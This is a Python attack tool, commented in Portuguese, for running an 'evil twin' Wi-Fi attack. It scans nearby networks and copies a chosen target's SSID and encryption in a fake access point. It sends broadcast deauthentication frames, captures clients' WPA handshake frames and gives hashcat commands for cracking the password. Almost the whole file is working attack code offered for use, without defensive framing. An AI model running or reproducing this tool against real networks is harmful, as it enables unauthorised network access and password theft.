#!/usr/bin/env python3

"""
Evil Twin Handshake Harvester

Cria AP falso idêntico ao target (mesmo SSID/crypto)
Quando cliente conecta, captura handshake automaticamente
SEM captive portal, SEM phishing - apenas handshake puro

Author: Marina "Lich_Queen"
Version: 1.0_Silent
"""

import os
import sys
import time
import subprocess
import threading
import signal
import tempfile
import shutil
import secrets
from datetime import datetime

try:
    from scapy.all import *
    from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, Dot11Auth, Dot11AssoReq, Dot11AssoResp, RadioTap, EAPOL, Dot11Deauth
except ImportError:
    print("[!] Scapy não instalado. Execute: pip3 install scapy")
    sys.exit(1)


# ============================================================================
# CONFIGURATION
# ============================================================================

CONFIG = {
    'version': '1.0_Silent',
    'captures_dir': os.path.expanduser('~/.evil_twin_captures'),
    'temp_dir': '/tmp/evil_twin_temp',
    'log_file': os.path.expanduser('~/.evil_twin_captures/evil_twin.log'),
}


# ============================================================================
# COLORS & LOGGING
# ============================================================================

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

def log_info(msg):
    print(f"{Colors.CYAN}[*]{Colors.RESET} {msg}")

def log_success(msg):
    print(f"{Colors.GREEN}[✓]{Colors.RESET} {msg}")

def log_warning(msg):
    print(f"{Colors.YELLOW}[!]{Colors.RESET} {msg}")

def log_error(msg):
    print(f"{Colors.RED}[✗]{Colors.RESET} {msg}")

def log_progress(msg):
    print(f"{Colors.BLUE}[→]{Colors.RESET} {msg}")


# ============================================================================
# CLEANUP HANDLER
# ============================================================================

class CleanupHandler:
    def __init__(self):
        self.processes = []
        self.temp_files = []
        self.interface = None
        
    def register_process(self, proc):
        self.processes.append(proc)
        
    def register_temp_file(self, filepath):
        self.temp_files.append(filepath)
        
    def register_interface(self, iface):
        self.interface = iface
        
    def cleanup(self):
        log_info("Executando cleanup...")
        
        # Kill processos
        for proc in self.processes:
            try:
                proc.terminate()
                proc.wait(timeout=3)
            except:
                try:
                    proc.kill()
                except:
                    pass
        
        # Remove temp files
        for tf in self.temp_files:
            try:
                if os.path.exists(tf):
                    os.remove(tf)
            except:
                pass
        
        # Restaura interface
        if self.interface:
            try:
                subprocess.run(['ip', 'link', 'set', self.interface, 'down'], 
                             stderr=subprocess.DEVNULL)
                subprocess.run(['iw', self.interface, 'set', 'type', 'managed'],
                             stderr=subprocess.DEVNULL)
                subprocess.run(['ip', 'link', 'set', self.interface, 'up'],
                             stderr=subprocess.DEVNULL)
                subprocess.run(['systemctl', 'start', 'NetworkManager'],
                             stderr=subprocess.DEVNULL)
            except:
                pass
        
        log_success("Cleanup completo")

cleanup_handler = CleanupHandler()

def signal_handler(sig, frame):
    cleanup_handler.cleanup()
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)


# ============================================================================
# UTILITIES
# ============================================================================

def require_root():
    if os.geteuid() != 0:
        log_error("Este script requer privilégios root")
        log_info("Execute com: sudo python3 evil_twin_handshake.py")
        sys.exit(1)

def setup_directories():
    os.makedirs(CONFIG['captures_dir'], mode=0o700, exist_ok=True)
    os.makedirs(CONFIG['temp_dir'], mode=0o700, exist_ok=True)

def detect_wireless_interface():
    try:
        result = subprocess.run(['iw', 'dev'], capture_output=True, text=True)
        interfaces = re.findall(r'Interface (\w+)', result.stdout)
        
        if not interfaces:
            return None
        
        for iface in interfaces:
            iface_info = subprocess.run(['iw', iface, 'info'], 
                                       capture_output=True, text=True)
            if 'type managed' in iface_info.stdout or 'type monitor' in iface_info.stdout:
                return iface
        
        return interfaces[0] if interfaces else None
    except:
        return None

def kill_interfering_processes():
    interfering = ['NetworkManager', 'wpa_supplicant', 'dhclient']
    
    for proc_name in interfering:
        try:
            result = subprocess.run(['pgrep', proc_name], 
                                  capture_output=True, text=True)
            if result.returncode == 0:
                log_warning(f"Matando processo interferente: {proc_name}")
                subprocess.run(['pkill', proc_name], stderr=subprocess.DEVNULL)
        except:
            pass


# ============================================================================
# NETWORK SCANNER
# ============================================================================

class NetworkScanner:
    def __init__(self, interface):
        self.interface = interface
        self.networks = {}
        self.lock = threading.Lock()
        
    def packet_handler(self, pkt):
        if pkt.haslayer(Dot11Beacon):
            try:
                bssid = pkt[Dot11].addr3
                
                ssid = None
                channel = None
                crypto = set()
                
                elt = pkt[Dot11Elt]
                while isinstance(elt, Dot11Elt):
                    if elt.ID == 0:  # SSID
                        ssid = elt.info.decode('utf-8', errors='ignore')
                    elif elt.ID == 3:  # DS Parameter set
                        channel = ord(elt.info)
                    elif elt.ID == 48:  # RSN
                        crypto.add('WPA2')
                    elif elt.ID == 221:  # Vendor
                        if b'\x00\x50\xf2\x01' in elt.info:
                            crypto.add('WPA')
                    elt = elt.payload
                
                # Check WEP
                if pkt.haslayer(Dot11Beacon):
                    cap = pkt[Dot11Beacon].cap
                    if 'privacy' in cap and not crypto:
                        crypto.add('WEP')
                
                if not ssid:
                    ssid = "<hidden>"
                
                signal = pkt.dBm_AntSignal if hasattr(pkt, 'dBm_AntSignal') else -70
                
                with self.lock:
                    if bssid not in self.networks:
                        self.networks[bssid] = {
                            'ssid': ssid,
                            'bssid': bssid,
                            'channel': channel,
                            'crypto': list(crypto) if crypto else ['Open'],
                            'signal': signal,
                        }
            except:
                pass
    
    def scan(self, duration=20):
        log_info(f"Scanning por {duration}s...")
        
        for channel in range(1, 12):
            subprocess.run(['iw', self.interface, 'set', 'channel', str(channel)],
                          stderr=subprocess.DEVNULL)
            
            sniff(iface=self.interface, prn=self.packet_handler, 
                  timeout=duration / 11, store=False)
        
        with self.lock:
            results = list(self.networks.values())
        
        log_success(f"Scan completo: {len(results)} redes encontradas")
        return results


# ============================================================================
# EVIL TWIN HANDSHAKE HARVESTER
# ============================================================================

class EvilTwinHandshakeHarvester:
    def __init__(self, interface, target):
        self.interface = interface
        self.target = target
        self.eapol_frames = []
        self.clients_seen = set()
        self.lock = threading.Lock()
        self.running = False
        
    def create_hostapd_config(self):
        """Cria hostapd config que REPLICA crypto do target"""
        ssid = self.target['ssid']
        channel = self.target['channel']
        crypto = self.target['crypto']
        
        # Config base
        config = f"""
interface={self.interface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
"""
        
        # Adiciona crypto IDÊNTICA ao target
        if 'WPA2' in crypto or 'WPA' in crypto:
            # WPA2-PSK com senha fake
            # Cliente vai tentar conectar, gerar handshake, e falhar auth
            # Mas handshake já foi capturado!
            config += """
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
rsn_pairwise=CCMP
wpa_passphrase=TemporaryFakePassword123
"""
        elif 'WEP' in crypto:
            config += """
auth_algs=3
wep_default_key=0
wep_key0=1234567890
"""
        else:
            # Open network
            config += """
auth_algs=1
"""
        
        config_path = os.path.join(CONFIG['temp_dir'], 'hostapd_evil.conf')
        
        with open(config_path, 'w') as f:
            f.write(config)
        
        os.chmod(config_path, 0o600)
        cleanup_handler.register_temp_file(config_path)
        
        return config_path
    
    def packet_sniffer(self, pkt):
        """Captura EAPOL frames quando cliente tenta conectar"""
        try:
            # EAPOL = handshake
            if pkt.haslayer(EAPOL):
                with self.lock:
                    self.eapol_frames.append(pkt)
                    log_success(f"EAPOL frame capturado! Total: {len(self.eapol_frames)}")
                    
                    # Extrai client MAC
                    if pkt.haslayer(Dot11):
                        client = pkt[Dot11].addr2
                        if client not in self.clients_seen:
                            self.clients_seen.add(client)
                            log_info(f"Cliente conectando: {client}")
            
            # Association Request = cliente tentando conectar
            elif pkt.haslayer(Dot11AssoReq):
                client = pkt[Dot11].addr2
                with self.lock:
                    if client not in self.clients_seen:
                        self.clients_seen.add(client)
                        log_progress(f"Cliente detectado: {client}")
        except:
            pass
    
    def has_complete_handshake(self):
        """Verifica se capturamos handshake completo (mínimo 4 frames)"""
        with self.lock:
            return len(self.eapol_frames) >= 4
    
    def deauth_original_ap(self):
        """
        Deauths AP original para forçar clientes a reconectar
        Clientes vão ver nosso fake AP e tentar conectar
        """
        target_bssid = self.target['bssid']
        channel = self.target['channel']
        
        log_info("Deauthing AP original para atrair clientes...")
        
        # Set channel para deauth
        subprocess.run(['iw', self.interface, 'set', 'channel', str(channel)],
                      stderr=subprocess.DEVNULL)
        
        # Broadcast deauth
        for _ in range(20):
            pkt = RadioTap() / Dot11(type=0, subtype=12, 
                                     addr1='ff:ff:ff:ff:ff:ff',
                                     addr2=target_bssid, 
                                     addr3=target_bssid) / Dot11Deauth(reason=7)
            
            sendp(pkt, iface=self.interface, verbose=False)
            time.sleep(0.1)
        
        log_success("Deauth waves enviadas")
    
    def attack(self, duration=300):
        """
        Executa Evil Twin attack completo
        
        Workflow:
        1. Restaura interface managed (hostapd precisa)
        2. Inicia fake AP com hostapd (mesmo SSID/crypto)
        3. Sniffa packets procurando EAPOL
        4. Deauths AP real periodicamente (opcional)
        5. Quando cliente conecta no fake, captura handshake
        6. Salva handshake em .cap
        """
        
        log_info(f"Iniciando Evil Twin contra: {self.target['ssid']}")
        log_info(f"BSSID original: {self.target['bssid']}")
        log_info(f"Channel: {self.target['channel']}")
        log_info(f"Crypto: {', '.join(self.target['crypto'])}")
        
        # Restaura managed mode
        subprocess.run(['ip', 'link', 'set', self.interface, 'down'],
                     stderr=subprocess.DEVNULL)
        subprocess.run(['iw', self.interface, 'set', 'type', 'managed'],
                     stderr=subprocess.DEVNULL)
        subprocess.run(['ip', 'link', 'set', self.interface, 'up'],
                     stderr=subprocess.DEVNULL)
        
        time.sleep(2)
        
        # Cria config hostapd
        hostapd_conf = self.create_hostapd_config()
        
        # Inicia fake AP
        log_info("Iniciando fake AP (hostapd)...")
        hostapd_proc = subprocess.Popen(
            ['hostapd', hostapd_conf],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        cleanup_handler.register_process(hostapd_proc)
        
        time.sleep(5)  # Aguarda AP estabilizar
        
        # Verifica se hostapd iniciou OK
        if hostapd_proc.poll() is not None:
            log_error("Hostapd falhou ao iniciar")
            log_error("Possíveis causas: driver incompatível, channel inválido")
            return None
        
        log_success("Fake AP ativo!")
        log_success(f"SSID: {self.target['ssid']}")
        log_info("Aguardando clientes conectarem...")
        
        self.running = True
        
        # Thread para sniffing contínuo
        def sniff_loop():
            while self.running:
                try:
                    sniff(iface=self.interface, prn=self.packet_sniffer, 
                          timeout=5, store=False)
                except:
                    pass
        
        sniff_thread = threading.Thread(target=sniff_loop, daemon=True)
        sniff_thread.start()
        
        # Opcional: Deauth AP original periodicamente
        # NOTA: Precisa de segunda interface WiFi para deauth simultâneo
        # Se tiver apenas uma interface, clientes precisam conectar naturalmente
        
        log_warning("Para acelerar: desconecte clientes manualmente do AP original")
        log_info("Ou use segunda interface WiFi para deauth attacks")
        
        # Aguarda handshakes
        start_time = time.time()
        last_count = 0
        
        while time.time() - start_time < duration:
            with self.lock:
                current_count = len(self.eapol_frames)
            
            if current_count > last_count:
                log_info(f"EAPOL frames capturados: {current_count}")
                last_count = current_count
            
            if self.has_complete_handshake():
                log_success("Handshake completo detectado!")
                break
            
            time.sleep(5)
        
        self.running = False
        hostapd_proc.terminate()
        
        # Salva captura
        if self.eapol_frames:
            filename = f"evil_twin_{self.target['ssid'].replace(' ', '_')}_{int(time.time())}.cap"
            filepath = os.path.join(CONFIG['captures_dir'], filename)
            
            with self.lock:
                wrpcap(filepath, self.eapol_frames)
            
            log_success("="*70)
            log_success(f"HANDSHAKE CAPTURADO VIA EVIL TWIN!")
            log_success(f"Arquivo: {filepath}")
            log_success(f"EAPOL frames: {len(self.eapol_frames)}")
            log_success(f"Clientes vistos: {len(self.clients_seen)}")
            log_success("="*70)
            
            log_info("\nPróximos passos:")
            log_info(f"1. hcxpcapngtool -o hash.hc22000 {filepath}")
            log_info(f"2. hashcat -m 22000 hash.hc22000 wordlist.txt")
            
            return filepath
        else:
            log_warning("Nenhum handshake capturado")
            log_info("Possíveis causas:")
            log_info("  - Nenhum cliente tentou conectar")
            log_info("  - Clientes não confiaram no fake AP")
            log_info("  - Channel mismatch")
            return None


# ============================================================================
# MAIN
# ============================================================================

def main():
    require_root()
    setup_directories()
    
    print(f"""
    ╔═══════════════════════════════════════════════════╗
    ║     Evil Twin Handshake Harvester v1.0           ║
    ║     Captura handshakes via fake AP (SEM phishing)║
    ║     Author: Marina "Lich_Queen"                  ║
    ╚═══════════════════════════════════════════════════╝
    """)
    
    # Detecta interface
    interface = detect_wireless_interface()
    
    if not interface:
        log_error("Nenhuma interface wireless detectada")
        sys.exit(1)
    
    log_success(f"Interface detectada: {interface}")
    cleanup_handler.register_interface(interface)
    
    # Kill processos interferentes
    kill_interfering_processes()
    
    # Set monitor mode para scan inicial
    log_info("Ativando modo monitor para scan...")
    subprocess.run(['ip', 'link', 'set', interface, 'down'], 
                 stderr=subprocess.DEVNULL)
    subprocess.run(['iw', interface, 'set', 'type', 'monitor'], 
                 stderr=subprocess.DEVNULL)
    subprocess.run(['ip', 'link', 'set', interface, 'up'], 
                 stderr=subprocess.DEVNULL)
    
    time.sleep(2)
    
    # Scan networks
    scanner = NetworkScanner(interface)
    networks = scanner.scan(duration=20)
    
    if not networks:
        log_error("Nenhuma rede encontrada")
        cleanup_handler.cleanup()
        return
    
    # Display targets
    print("\n" + "="*80)
    print(f"{'#':<4} {'SSID':<30} {'BSSID':<20} {'CH':<4} {'PWR':<5} {'Crypto':<15}")
    print("="*80)
    
    for i, net in enumerate(networks, 1):
        ssid = net['ssid'][:29]
        bssid = net['bssid']
        channel = net.get('channel', '?')
        signal = net.get('signal', -100)
        crypto = ','.join(net.get('crypto', ['?']))[:14]
        
        print(f"{i:<4} {ssid:<30} {bssid:<20} {channel:<4} {signal:<5} {crypto:<15}")
    
    print("="*80 + "\n")
    
    # Select target
    try:
        choice = int(input("[?] Selecione o target (número): ").strip())
        target = networks[choice - 1]
    except:
        log_error("Seleção inválida")
        cleanup_handler.cleanup()
        return
    
    # Confirma ataque
    log_warning(f"Target selecionado: {target['ssid']} ({target['bssid']})")
    confirm = input("[?] Iniciar Evil Twin attack? (y/N): ").strip().lower()
    
    if confirm != 'y':
        log_info("Attack cancelado")
        cleanup_handler.cleanup()
        return
    
    # Executa attack
    harvester = EvilTwinHandshakeHarvester(interface, target)
    
    try:
        result = harvester.attack(duration=300)  # 5 minutos
    finally:
        cleanup_handler.cleanup()


if __name__ == '__main__':
    main()
